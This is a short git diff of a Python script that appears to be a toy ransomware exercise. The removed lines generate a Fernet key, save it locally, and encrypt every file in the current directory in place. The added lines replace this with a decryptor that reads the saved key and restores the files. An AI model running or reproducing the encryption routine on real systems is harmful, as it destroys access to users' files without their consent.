@@ -9,18 +9,12 @@ for file in os.listdir():
     if os.path.isfile(file):
         fileList.append(file)
 
-print(fileList)
-
-key = Fernet.generate_key()
-
-print(key)
-
-with open("generatedkey.key", "wb") as generatedkey:
-    generatedkey.write(key)
+with open("generatedkey.key", "rb") as generatedkey:
+    secretKey = generatedkey.read()
 
 for file in fileList:
     with open(file, "rb") as theFile:
         contents = theFile.read()
-    contentsEncrypted = Fernet(key).encrypt(contents)
+    contentsDecrypted = Fernet(secretKey).decrypt(contents)
     with open (file, "wb") as theFile:
-        theFile.write(contentsEncrypted)
+        theFile.write(contentsDecrypted)
